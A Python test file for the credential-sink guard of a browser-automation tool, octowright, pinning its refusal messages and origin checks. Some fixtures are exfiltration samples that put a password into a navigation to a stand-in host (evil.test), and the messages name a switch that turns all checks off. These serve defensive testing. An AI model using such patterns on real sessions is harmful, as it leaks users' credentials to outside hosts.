# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""The credential-sink guard's refusals, origins and edge shapes, pinned exactly.

Every refusal here is user-visible: it is the error a macro run (live or the
exported CLI) fails with, and each one tells the author how to proceed. So the
messages are compared whole, and the shapes the guard reads -- a header list
instead of a dict, a pattern that is not a string, an origin whose host is an
IPv6 literal, a page URL that does not parse -- are pinned to what the guard
actually decides for them.
"""

from __future__ import annotations

import re
from typing import Any

import pytest

from octowright import credential_sinks as cs
from octowright.placeholders import PLACEHOLDER_PATTERN

CREDENTIALS = frozenset({"password", "token"})


def _is_credential(name: str) -> bool:
    return name in CREDENTIALS


def _expand(actions: list[dict[str, Any]], args: dict[str, Any], **kwargs: Any) -> list[dict[str, Any]]:
    return cs.expand_actions(actions, args, is_credential=_is_credential, placeholder=PLACEHOLDER_PATTERN, **kwargs)


@pytest.fixture(autouse=True)
def _default_modes(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv(cs.CREDENTIAL_SINKS_ENV, raising=False)
    monkeypatch.delenv(cs.CREDENTIAL_FILL_ORIGINS_ENV, raising=False)


# --- origins ---------------------------------------------------------------


@pytest.mark.parametrize(
    ("origin", "shown"),
    [
        (("https", "app.test", 443), "https://app.test"),
        (("http", "app.test", 80), "http://app.test"),
        (("https", "app.test", 8443), "https://app.test:8443"),
        (("http", "::1", 80), "http://[::1]"),
        (("http", "::1", 3000), "http://[::1]:3000"),
    ],
)
def test_format_origin(origin: cs.Origin, shown: str) -> None:
    assert cs.format_origin(origin) == shown


@pytest.mark.parametrize("pattern", [None, 7, ["https://app.test/**"], {"u": "https://app.test/"}])
def test_a_pattern_that_is_not_a_string_names_no_origin(pattern: object) -> None:
    assert cs.pattern_origin(pattern) is None


def test_a_literal_pattern_names_its_origin() -> None:
    assert cs.pattern_origin("https://App.test/api/**") == ("https", "app.test", 443)


# --- forward_on_redirect ---------------------------------------------------

_SHAPE = 'forward_on_redirect must map a header name to true or false, such as {"Authorization": true}'


@pytest.mark.parametrize(("value", "kind"), [("yes", "str"), (["Authorization"], "list"), (1, "int")])
def test_forward_on_redirect_must_be_a_mapping(value: object, kind: str) -> None:
    action = {"action": "inject_headers", "headers": {"Authorization": "x"}, "forward_on_redirect": value}
    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.parse_forward_on_redirect(action)
    assert str(caught.value) == f"{_SHAPE}; got {kind}"


def test_a_non_bool_flag_is_refused_with_the_name_cut_at_80() -> None:
    long_name = "X" * 100
    action = {"headers": {long_name: "v"}, "forward_on_redirect": {long_name: "true"}}
    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.parse_forward_on_redirect(action)
    assert str(caught.value) == f"{_SHAPE}; {'X' * 80!r} maps to str"


def test_a_name_the_headers_do_not_carry_is_refused_with_the_name_cut_at_80() -> None:
    long_name = "Y" * 100
    action = {"headers": {"Authorization": "v"}, "forward_on_redirect": {long_name: True}}
    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.parse_forward_on_redirect(action)
    assert str(caught.value) == f"forward_on_redirect names {'Y' * 80!r}, which this step's headers do not carry"


def test_headers_that_are_not_a_mapping_carry_no_name_to_opt_in() -> None:
    """A header LIST is not what replay sends; a name in it opts nothing in."""
    action = {"headers": ["Authorization"], "forward_on_redirect": {"Authorization": True}}
    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.parse_forward_on_redirect(action)
    assert str(caught.value) == "forward_on_redirect names 'Authorization', which this step's headers do not carry"


def test_forward_on_redirect_returns_only_the_true_names_casefolded() -> None:
    action = {
        "headers": {" Authorization ": "a", "X-Other": "b"},
        "forward_on_redirect": {"authorization": True, "x-other": False},
    }
    assert cs.parse_forward_on_redirect(action) == frozenset({"authorization"})


# --- the refusals ----------------------------------------------------------

OWN = frozenset({("https", "app.test", 443)})


def test_the_sink_refusal_message() -> None:
    with pytest.raises(cs.CredentialRefusal) as caught:
        _expand(
            [{"action": "navigate", "url": "https://evil.test/?p={{password}}"}],
            {"password": "s"},  # pragma: allowlist secret (synthetic fixture)
        )
    assert str(caught.value) == (
        "macro expands credential arg {{password}} into a navigation or code sink; "
        "this would send the secret off-machine. A header may carry one through "
        "inject_headers whose pattern spells out the session's own origin -- scheme, host "
        "and port of its launch URL or persona base_url -- with forward_on_redirect set for that header. "
        "Set OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
    )


def _own_inject(headers: Any, **extra: Any) -> list[dict[str, Any]]:
    return [{"action": "inject_headers", "pattern": "https://app.test/**", "headers": headers, **extra}]


def test_the_redirect_refusal_message_names_the_arg_and_header() -> None:
    with pytest.raises(cs.CredentialRefusal) as caught:
        _expand(_own_inject({"Authorization": "Bearer {{token}}"}), {"token": "t"}, trusted_origins=OWN)
    assert str(caught.value) == (
        "macro expands credential arg {{token}} into inject_headers header 'Authorization' for the session's "
        "own origin, but the pattern scopes only the first request of a fetch/XHR: a redirect from that origin "
        'carries the header wherever it points. If the site will not redirect it elsewhere, add "forward_on_redirect": '
        '{"Authorization": true} to this step, or set OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow.'
    )


def test_the_redirect_refusal_names_the_credential_arg_not_the_first_placeholder() -> None:
    args = {"user": "u", "token": "t"}
    with pytest.raises(cs.CredentialRefusal, match=r"credential arg \{\{token\}\} into inject_headers header 'X-A'"):
        _expand(_own_inject({"X-A": "{{user}}:{{token}}"}), args, trusted_origins=OWN)


def test_a_credential_name_the_header_text_cannot_show_is_reported_as_a_question_mark() -> None:
    """A nested value is searched through its repr, which escapes a newline in the name."""
    secret_name = "pass\nword"  # pragma: allowlist secret (an arg name, not a value)

    def is_credential(name: str) -> bool:
        return name == secret_name

    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.expand_actions(
            _own_inject({"X-A": {"v": "{{" + secret_name + "}}"}}),
            {secret_name: "s"},  # pragma: allowlist secret (synthetic fixture)
            is_credential=is_credential,
            placeholder=PLACEHOLDER_PATTERN,
            trusted_origins=OWN,
        )
    assert str(caught.value).startswith("macro expands credential arg {{?}} into inject_headers header 'X-A' ")


def test_an_opted_in_own_site_header_expands_and_the_others_are_judged() -> None:
    actions = _own_inject(
        {"Authorization": "Bearer {{token}}", "X-Plain": "{{user}}"}, forward_on_redirect={"Authorization": True}
    )
    [out] = _expand(actions, {"token": "t", "user": "u"}, trusted_origins=OWN)
    assert out == {
        "action": "inject_headers",
        "url_pattern": "https://app.test/**",
        "headers": {"Authorization": "Bearer t", "X-Plain": "u"},
        "forward_on_redirect": {"Authorization": True},
    }


@pytest.mark.parametrize("headers", ["Authorization: Bearer {{token}}", ["Bearer {{token}}"]])
def test_own_site_headers_that_are_not_a_mapping_stay_a_sink(headers: Any) -> None:
    """No header name to opt in, so the opt-in cannot exempt them."""
    with pytest.raises(cs.CredentialRefusal, match="navigation or code sink"):
        _expand(_own_inject(headers, forward_on_redirect={}), {"token": "t"}, trusted_origins=OWN)


def test_mock_route_headers_to_the_own_site_are_response_headers() -> None:
    actions = [{"action": "mock_route", "pattern": "https://app.test/**", "headers": "{{token}}"}]
    [out] = _expand(actions, {"token": "t"}, trusted_origins=OWN)
    assert out == {"action": "mock_route", "url_pattern": "https://app.test/**", "headers": "t"}


# --- allowed_origins -------------------------------------------------------


@pytest.mark.parametrize(("value", "kind"), [("https://login.test", "str"), ({"a": 1}, "dict"), (3, "int")])
def test_allowed_origins_must_be_a_list(value: object, kind: str) -> None:
    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.parse_allowed_origins(value)
    assert str(caught.value) == (
        f"allowed_origins must be a list of origins such as ['https://login.example'], got {kind}"
    )


def test_an_inexact_allowed_origin_is_refused_and_cut_at_120() -> None:
    entry = "https://login.test/" + "p" * 200
    with pytest.raises(cs.CredentialRefusal) as caught:
        cs.parse_allowed_origins([entry])
    assert str(caught.value) == (
        f"allowed_origins entry {entry[:120]!r} is not an exact origin; write it "
        "literally as scheme://host[:port], with no wildcard, path or {{placeholder}}"
    )


# --- the fill-origin check -------------------------------------------------


def test_credential_fill_mode(monkeypatch: pytest.MonkeyPatch) -> None:
    assert cs.credential_fill_mode() == "block"
    monkeypatch.setenv(cs.CREDENTIAL_FILL_ORIGINS_ENV, "  WARN ")
    assert cs.credential_fill_mode() == "warn"
    monkeypatch.setenv(cs.CREDENTIAL_FILL_ORIGINS_ENV, "warning")
    assert cs.credential_fill_mode() == "block"


_MARKED = {"action": "fill", "value": "x", cs.CREDENTIAL_FILL_MARKER: ["password"]}


@pytest.mark.parametrize(
    ("url", "shown"),
    [
        ("https://evil.test/login?x=1", "https://evil.test"),
        ("about:blank", "about:"),
        ("data:text/html,hi", "data:"),
        ("", "<no page>"),
        (None, "<no page>"),
        ("not a url", "<no page>"),
        # urlsplit itself refuses an unclosed IPv6 bracket.
        ("http://[::1", "<no page>"),
    ],
)
def test_offsite_credential_origin_shows_only_the_origin(url: object, shown: str) -> None:
    assert cs.offsite_credential_origin(_MARKED, url, OWN) == shown


def test_the_own_origin_and_a_listed_origin_are_not_offsite() -> None:
    assert cs.offsite_credential_origin(_MARKED, "https://app.test/a", OWN) is None
    listed = {**_MARKED, "allowed_origins": ["https://login.test"]}
    assert cs.offsite_credential_origin(listed, "https://login.test/x", OWN) is None


def test_the_fill_refusal_message() -> None:
    action = {"action": "type", cs.CREDENTIAL_FILL_MARKER: ["password", "token"]}
    assert str(cs.credential_fill_refusal(action, "https://evil.test")) == (
        "macro type would type credential arg {{password}}, {{token}} into a page at https://evil.test, "
        "which is not the session's own origin (its launch URL or persona base_url). For an "
        'intended sign-in hop, list the origin literally on this step: "allowed_origins": ["https://evil.test"]. '
        "OCTOWRIGHT_MACRO_CREDENTIAL_FILL_ORIGINS=warn logs and runs the step instead; "
        "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow turns every credential check off."
    )


def test_a_stopped_type_says_the_rest_was_not_typed_by_default() -> None:
    action = {"action": "type", cs.CREDENTIAL_FILL_MARKER: ["password", "token"]}
    stopped = cs.credential_input_stopped(action, "the page navigated")
    assert isinstance(stopped, cs.CredentialInputHalted)
    assert str(stopped) == (
        "macro type stopped typing credential arg {{password}}, {{token}}: the page navigated. "
        "The rest of the value was not typed; re-run the step once the page has settled."
    )


def test_a_step_stopped_before_typing_says_nothing_was_typed() -> None:
    action = {"action": "fill", cs.CREDENTIAL_FILL_MARKER: ["password", "token"]}
    stopped = cs.credential_input_stopped(action, "the frame changed", started=False)
    assert str(stopped) == (
        "macro fill did not start typing credential arg {{password}}, {{token}}: the frame changed. "
        "Nothing was typed; re-run the step once the page has settled."
    )


# --- page code -------------------------------------------------------------


def test_a_mock_route_body_is_page_code_named_body() -> None:
    assert cs.page_code_field({"action": "mock_route", "body": "alert(1)"}) == "body"
    assert cs.page_code_field({"action": "fulfill", "body": "alert(1)"}) is None


def test_the_page_code_refusal_message() -> None:
    refusal = cs.page_code_refusal({"action": "evaluate", "expression": "1"}, ["password", "token"])
    assert refusal is not None
    assert str(refusal) == (
        "macro evaluate runs page code (expression) in a run that types credential arg {{password}}, {{token}}; "
        "page code can read a typed credential back and send it anywhere. Run it in a macro that carries "
        "no credential, or set OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
    )


def test_an_if_selector_walks_the_fields_after_its_branches() -> None:
    """Only ``then``/``else`` are conditional; a field after them always runs."""
    step = {
        "action": "if_selector",
        "selector": "#x",
        "then": [{"action": "evaluate", "expression": "untaken()"}],
        "actions": [{"action": "evaluate", "expression": "always()"}],
    }
    with pytest.raises(cs.CredentialRefusal, match=r"macro evaluate runs page code \(expression\)"):
        cs.refuse_page_code([step], ["password"])
    cs.refuse_page_code([{**step, "actions": []}], ["password"])


def test_credential_args_in_finds_names_at_any_depth() -> None:
    actions = [{"action": "fill", "value": "{{password}}", "nested": [{"a": "{{token}} {{user}}"}]}]
    found = cs.credential_args_in(actions, is_credential=_is_credential, placeholder=re.compile(PLACEHOLDER_PATTERN))
    assert found == ["password", "token"]


# --- macro_call taint and expansion ----------------------------------------


def test_a_macro_call_is_tainted_only_by_args_that_mention_a_credential() -> None:
    actions = [
        {
            "action": "macro_call",
            "name": "inner",
            "args": {"count": 5, "flag": True, "pw": "{{password}}", "nested": {"x": ["{{token}}"]}, "u": "{{user}}"},
        }
    ]
    [out] = _expand(actions, {"password": "p", "token": "t", "user": "u"})
    assert out[cs.CREDENTIAL_CALL_MARKER] == ["nested", "pw"]


def test_expansion_shares_no_state_with_the_written_macro() -> None:
    written = [{"action": "click", "selector": "#a", "extra": {1, 2}}]
    [out] = _expand(written, {})
    out["extra"].add(3)
    assert written[0]["extra"] == {1, 2}


# --- shapes the guard must read exactly ------------------------------------


@pytest.mark.parametrize(
    ("url", "origin"),
    [
        ("https://App.Test./x", ("https", "app.test", 443)),
        ("https://app.test:8443", ("https", "app.test", 8443)),
        ("https:///no-host", None),
        ("ftp://app.test/", None),
        ("http://app.test:99999/", None),
        ("", None),
        (None, None),
    ],
)
def test_url_origin(url: object, origin: object) -> None:
    assert cs.url_origin(url) == origin


def test_an_unscoped_header_action_gets_no_own_site_exemption() -> None:
    """set_extra_http_headers rides every request, whatever its pattern says."""
    actions = [
        {"action": "set_extra_http_headers", "url_pattern": "https://app.test/**", "headers": {"A": "{{token}}"}}
    ]
    with pytest.raises(cs.CredentialRefusal, match="navigation or code sink"):
        _expand(actions, {"token": "t"}, trusted_origins=OWN)


def test_credential_args_add_to_the_name_classifier() -> None:
    """A call's tainted names join the credential tier; they do not replace the name rule."""
    actions = [{"action": "navigate", "url": "https://evil.test/?a={{password}}"}]
    with pytest.raises(cs.CredentialRefusal, match=r"\{\{password\}\}"):
        _expand(actions, {"password": "p"}, credential_args=frozenset({"other"}))
    with pytest.raises(cs.CredentialRefusal, match=r"\{\{label\}\}"):
        _expand(
            [{"action": "navigate", "url": "https://evil.test/?b={{label}}"}],
            {"label": "l"},
            credential_args=frozenset({"label"}),
        )


def test_credential_args_in_accepts_a_pattern_string() -> None:
    found = cs.credential_args_in(
        [{"value": "{{token}}"}], is_credential=_is_credential, placeholder=PLACEHOLDER_PATTERN
    )
    assert found == ["token"]


def test_every_step_of_a_try_and_of_nested_lists_is_reached() -> None:
    evaluate = {"action": "evaluate", "expression": "x()"}
    for actions in (
        [{"action": "try", "actions": [{"action": "click", "selector": "#a"}, evaluate]}],
        [{"action": "try", "branches": [{"action": "click", "selector": "#a"}, evaluate]}],
        [[{"action": "click", "selector": "#a"}], evaluate],
    ):
        with pytest.raises(cs.CredentialRefusal, match="runs page code"):
            cs.refuse_page_code(actions, ["password"])


def test_only_a_try_eachs_first_branch_is_always_reached() -> None:
    evaluate = {"action": "evaluate", "expression": "x()"}
    cs.refuse_page_code([{"action": "try_each", "branches": [[], [evaluate]]}], ["password"])
    with pytest.raises(cs.CredentialRefusal, match="runs page code"):
        cs.refuse_page_code([{"action": "try_each", "branches": [[evaluate], []]}], ["password"])
    with pytest.raises(cs.CredentialRefusal, match="runs page code"):
        cs.refuse_page_code([{"action": "try_each", "branches": [], "setup": {"x": [{}, evaluate]}}], ["password"])


def test_a_credential_action_name_is_refused() -> None:
    with pytest.raises(cs.CredentialRefusal) as caught:
        _expand([{"action": "{{password}}"}], {"password": "fill"})  # pragma: allowlist secret (synthetic fixture)
    assert str(caught.value) == (
        "macro uses credential arg {{password}} as an action name; an action name must "
        "be written literally or come from a non-credential arg"
    )


def test_an_action_name_is_expanded_once() -> None:
    """An argument's value is data: placeholder syntax inside it is not expanded again."""
    [out] = _expand([{"action": "{{kind}}", "selector": "#a"}], {"kind": "{{other}}", "other": "click"})
    assert out == {"action": "{{other}}", "selector": "#a"}


def test_the_macro_cannot_write_the_guards_markers() -> None:
    written = {
        "action": "macro_call",
        "name": "inner",
        "args": {"q": "plain"},
        cs.CREDENTIAL_CALL_MARKER: ["q"],
        cs.CREDENTIAL_FILL_MARKER: ["q"],
    }
    assert _expand([written], {}) == [{"action": "macro_call", "name": "inner", "args": {"q": "plain"}}]


def test_only_a_macro_call_is_tainted() -> None:
    [out] = _expand([{"action": "click", "selector": "#a", "args": {"p": "{{password}}"}}], {"password": "p"})
    assert out == {"action": "click", "selector": "#a", "args": {"p": "p"}}


def test_forward_on_redirect_is_read_only_where_replay_reads_it() -> None:
    actions = [{"action": "mock_route", "pattern": "**/api", "body": "{}", "forward_on_redirect": "anything"}]
    assert _expand(actions, {}) == [
        {"action": "mock_route", "url_pattern": "**/api", "body": "{}", "forward_on_redirect": "anything"}
    ]


def test_the_unchecked_input_refusal_message() -> None:
    with pytest.raises(cs.CredentialRefusal) as caught:
        _expand(
            [{"action": "press_key", "key": "{{password}}{{token}}"}],
            {"password": "p", "token": "t"},  # pragma: allowlist secret (synthetic fixture)
        )
    assert str(caught.value) == (
        "macro press_key puts credential arg {{password}}, {{token}} into the page through 'key', "
        "where nothing checks which origin receives it. Key a credential in with a type or "
        "fill step, which do; set OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow if that is intended."
    )
